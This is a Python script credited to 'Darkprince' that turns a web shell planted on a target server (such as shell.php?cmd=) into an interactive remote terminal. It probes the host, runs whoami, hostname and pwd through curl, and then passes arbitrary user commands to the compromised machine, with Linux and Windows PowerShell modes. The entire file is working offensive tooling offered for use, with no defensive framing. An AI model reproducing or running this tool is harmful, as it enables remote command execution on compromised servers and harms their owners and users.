#!/bin/python3
print(r"""
Author : Darkprince
 ____    ____  ____  _  ______  ____  ___ _   _  ____ _____         ____  _   _ _____ _     _
|  _ \  / __ \|  _ \| |/ /  _ \|  _ \|_ _| \ | |/ ___| ____|       / ___|| | | | ____| |   | |
| | | |/ / _` | |_) | ' /| |_) | |_) || ||  \| | |   |  _|         \___ \| |_| |  _| | |   | |
| |_| | | (_| |  _ <| . \|  __/|  _ < | || |\  | |___| |___         ___) |  _  | |___| |___| |___
|____/ \ \__,_|_| \_\_|\_\_|   |_| \_\___|_| \_|\____|_____|       |____/|_| |_|_____|_____|_____|
        \____/
""")
import os
import sys
import urllib
import urllib.request
from socket import timeout
try:
    domain = sys.argv[1]
    port = sys.argv[2]
    shell_path = sys.argv[3]
    target_os = sys.argv[4]
except:
    print("\nUsage : python3 shell.py target.com 80 /blog/shell.php?cmd= linux")
    print("        python3 shell.py example.com 443 /uploads/shell.php?param= windows")
    print("\nShell can php,asp... but it must be a command shell!")
    print("\nos can be windows/linux/mac.")
arguments = sys.argv[1:]
count = len(arguments)
if count < 1:
    print("\nThis program requires 4 arguments!\n")
else:
    port = str(port) #port
    handler = "curl -s -k"
    proto = "http";pwd_cmd = "pwd"
    env = "$";pwd = "pwd"
    if target_os == "windows":
        pwd_cmd = "($pwd).path"
        pwd = "cd ,"
        env = " ps>"
    if port == "443":
        proto = "https"
    try:
        urllib.request.urlopen(proto + "://" +domain + ":" + port, timeout=5).getcode()
    except:
        print("Error : Unable to reach the target, please check the connection!")
        exit()
    else:
        dir = os.popen(handler + " " + domain + ":" + port + shell_path + pwd).read().split('\n')
        dir = dir[0]
        user = os.popen(handler +" " + domain + ":" + port + shell_path + "whoami").read().split('\n')
        user = user[0]
        if user == "root":
            env = "#"
        host = os.popen(handler +" " + domain + ":" + port + shell_path + "hostname").read().split('\n')
        host = host[0]
        if dir == '' or user == '' or host == '':
            print("No response from target shell. please check the shell path!")
            exit()
        user = os.popen(handler +" " + domain + ":" + port + shell_path + "whoami").read().split('\n')
        user = user[0]
        if user == "root":
            env = "#"
        shell = (user + "@" + host + ":" )
        while(1):
            user = os.popen(handler +" " + domain + ":" + port + shell_path + "whoami").read().split('\n')
            user = user[0]
            if user == "root":
                env = "#"
            query = input(shell + dir + env)
            query = query.replace(' ', '+')
            if target_os == "linux" or target_os == "mac":
                cd = query.startswith( 'cd')
                if cd == True:
                    try:
                        urllib.request.urlopen(proto + "://" +domain + ":" + port, timeout=5).getcode()
                    except:
                        print("Error : Unable to reach the target, please check the connection!")
                        continue
                    else:
                        dir = os.popen(handler + " " + domain + ":" + port + shell_path + "'" + query + ";" + pwd_cmd + "'").read().split('\n')
                        dir = dir[0]
                else:
                    try:
                        urllib.request.urlopen(proto + "://" +domain + ":" + port, timeout=5).getcode()
                    except:
                        print("Error : Unable to reach the target, please check the connection!")
                        continue
                    else:
                        os.system(handler + " " + domain + ":" + port + shell_path + "'" + "cd" + "+" + dir + ";" + query + "'")

            cd = query.startswith( 'cd')
            if target_os == "windows":
                if cd == True:
                    try:
                        urllib.request.urlopen(proto + "://" +domain + ":" + port, timeout=5).getcode()
                    except:
                        print("Error : Unable to reach the target, please check the connection!")
                        continue
                    else:
                        dir = os.popen(handler + " " + domain + ":" + port + shell_path + "powershell" + "+" + "'" + query + ";" + pwd_cmd + "'").read().split('\n')
                        dir = dir[0]
                else:
                    try:
                        urllib.request.urlopen(proto + "://" +domain + ":" + port, timeout=5).getcode()
                    except:
                        print("Error : Unable to reach the target, please check the connection!")
                        continue
                    else:
                            os.system(handler + " " + domain + ":" + port + shell_path + "powershell" + "+" + "'cd+" + dir + ";" + query + "'")

            if query == "clear" or query == "cls":
                 os.system("clear")
            if query == "exit" or query == "quit":
                print("Thanks for using my shell")
                exit()
